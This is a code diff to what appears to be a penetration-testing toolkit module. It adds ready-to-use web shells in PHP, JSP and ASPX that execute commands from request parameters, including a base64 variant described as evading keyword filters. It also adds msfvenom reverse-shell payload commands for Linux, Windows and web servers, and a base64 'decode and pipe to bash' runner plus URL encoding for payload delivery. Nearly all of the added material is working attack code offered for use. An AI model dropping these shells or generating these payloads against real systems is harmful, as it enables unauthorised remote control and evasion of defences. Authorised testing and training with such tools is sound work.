@@ -68,6 +68,47 @@
     ];
   }
 
+  // ── web shells: files you drop on the target (upload, LFI-to-RCE, writable webroot) ──────────────
+  // Static text, not LHOST/LPORT templates: browse to them and pass your command as a parameter.
+  var WEBSHELLS = [
+    { id: 'php-cmd', name: 'PHP cmd', ext: 'php', code: "<?php system($_GET['cmd']); ?>", note: 'Browse to shell.php?cmd=id. The simplest PHP web shell.' },
+    { id: 'php-eval', name: 'PHP eval (POST)', ext: 'php', code: "<?php eval($_POST['x']); ?>", note: "POST x=system('id'); keeps your command out of the URL and the access log." },
+    { id: 'php-b64', name: 'PHP passthru (base64)', ext: 'php', code: "<?php echo passthru(base64_decode($_GET['c'])); ?>", note: 'shell.php?c=BASE64, where BASE64 decodes to your command. Slips past naive keyword filters.' },
+    { id: 'jsp-cmd', name: 'JSP cmd', ext: 'jsp', code: '<%@ page import="java.io.*" %><% Process p=Runtime.getRuntime().exec(request.getParameter("cmd"));BufferedReader r=new BufferedReader(new InputStreamReader(p.getInputStream()));String l;while((l=r.readLine())!=null){out.println(l);} %>', note: 'For Tomcat / Java app servers. Browse to shell.jsp?cmd=id.' },
+    { id: 'aspx-cmd', name: 'ASPX cmd', ext: 'aspx', code: '<%@ Page Language="C#" %><%@ Import Namespace="System.Diagnostics" %><%@ Import Namespace="System.IO" %><% ProcessStartInfo psi=new ProcessStartInfo("cmd.exe","/c "+Request["cmd"]);psi.RedirectStandardOutput=true;psi.UseShellExecute=false;Process p=Process.Start(psi);Response.Write(p.StandardOutput.ReadToEnd()); %>', note: 'For IIS / ASP.NET. Browse to shell.aspx?cmd=whoami.' },
+  ];
+  function webshells() { return WEBSHELLS.map(function (w) { return { id: w.id, name: w.name, ext: w.ext, code: w.code, note: w.note }; }); }
+
+  // ── msfvenom one-liners: when you want a generated payload file instead of a one-line shell ──────
+  function msfvenom(lhost, lport) {
+    lhost = lhost || 'LHOST'; lport = String(lport || '4444');
+    var rows = [
+      { id: 'linux-elf', name: 'Linux ELF', os: 'linux', payload: 'linux/x64/shell_reverse_tcp', fmt: 'elf', out: 'shell.elf', note: 'Staged plain shell; catch with netcat. Use the meterpreter payload only with multi/handler.' },
+      { id: 'windows-exe', name: 'Windows EXE', os: 'windows', payload: 'windows/x64/shell_reverse_tcp', fmt: 'exe', out: 'shell.exe', note: 'Drop and run on the target; catch with netcat.' },
+      { id: 'windows-exe-met', name: 'Windows EXE (meterpreter)', os: 'windows', payload: 'windows/x64/meterpreter/reverse_tcp', fmt: 'exe', out: 'met.exe', note: 'Catch with metasploit multi/handler (the catcher above), not netcat.' },
+      { id: 'php', name: 'PHP', os: 'web', payload: 'php/reverse_php', fmt: 'raw', out: 'shell.php', note: 'Upload to a PHP app; add <?php at the top if the raw output lacks it. Catch with netcat.' },
+      { id: 'aspx', name: 'ASPX', os: 'web', payload: 'windows/x64/shell_reverse_tcp', fmt: 'aspx', out: 'shell.aspx', note: 'For an IIS upload. Catch with netcat.' },
+      { id: 'war', name: 'JSP WAR', os: 'web', payload: 'java/jsp_shell_reverse_tcp', fmt: 'war', out: 'shell.war', note: 'Deploy to Tomcat manager. Catch with netcat.' },
+      { id: 'python', name: 'Python', os: 'linux', payload: 'cmd/unix/reverse_python', fmt: 'raw', out: 'shell.py', note: 'When you can run python on the target but not drop a binary.' },
+    ];
+    return rows.map(function (r) {
+      return { id: r.id, name: r.name, os: r.os, note: r.note,
+        cmd: 'msfvenom -p ' + r.payload + ' LHOST=' + lhost + ' LPORT=' + lport + ' -f ' + r.fmt + ' -o ' + r.out };
+    });
+  }
+
+  // ── payload encoders: base64-runner (quoting-proof delivery) and URL-encode (inject via a param) ──
+  function b64utf8(str) {
+    if (typeof Buffer !== 'undefined') return Buffer.from(String(str), 'utf8').toString('base64');
+    try { return btoa(unescape(encodeURIComponent(String(str)))); } catch (e) { return btoa(String(str)); }
+  }
+  // Wrap a shell payload so it is delivered as base64 and decoded on the target: survives quoting and
+  // odd terminals, exactly the trick OffSec teaches for pasting a reverse shell through a fragile prompt.
+  function b64Runner(cmd) { return 'echo ' + b64utf8(cmd) + ' | base64 -d | bash'; }
+  function urlEncode(cmd) { return encodeURIComponent(String(cmd)); }
+  // encodePayload(cmd, how): how = 'b64' (base64 runner) | 'url' (percent-encoded) | anything else = raw.
+  function encodePayload(cmd, how) { return how === 'b64' ? b64Runner(cmd) : (how === 'url' ? urlEncode(cmd) : String(cmd)); }
+
   function catchers() { return CATCHERS.slice(); }
   function catcherById(id) { return CATCHERS.filter(function (c) { return c.id === id; })[0] || CATCHERS[0]; }
   function payloads(lhost, lport) { return PAYLOADS.map(function (p) { return { id: p.id, name: p.name, os: p.os, enc: p.enc || '', note: p.note, cmd: fill(p.tpl, lhost, lport) }; }); }
@@ -113,6 +154,16 @@
     });
     L.push('OBOL_EOF');
     L.push('echo');
+    L.push('echo "--- msfvenom payload files (generate on YOUR box) ---"');
+    L.push('cat <<\'OBOL_EOF\'');
+    msfvenom(lhost, lport).forEach(function (m) { L.push('# ' + m.name + ': ' + m.note); L.push(m.cmd); L.push(''); });
+    L.push('OBOL_EOF');
+    L.push('echo');
+    L.push('echo "--- web shells (drop in a writable webroot, then browse to them) ---"');
+    L.push('cat <<\'OBOL_EOF\'');
+    webshells().forEach(function (w) { L.push('# ' + w.name + ' (shell.' + w.ext + '): ' + w.note); L.push(w.code); L.push(''); });
+    L.push('OBOL_EOF');
+    L.push('echo');
     L.push('echo "--- After you catch the shell, upgrade the TTY ---"');
     L.push('cat <<\'OBOL_EOF\'');
     ttyUpgrade().forEach(function (line) { L.push(line); });
@@ -127,5 +178,6 @@
   OBOL.shellkit = {
     catchers: catchers, catcherById: catcherById, payloads: payloads, fill: fill,
     psEncode: psEncode, psEncodedCommand: psEncodedCommand, ttyUpgrade: ttyUpgrade, listenerKit: listenerKit,
+    webshells: webshells, msfvenom: msfvenom, encodePayload: encodePayload, b64Runner: b64Runner, urlEncode: urlEncode,
   };
 })(typeof globalThis !== 'undefined' ? globalThis : this);
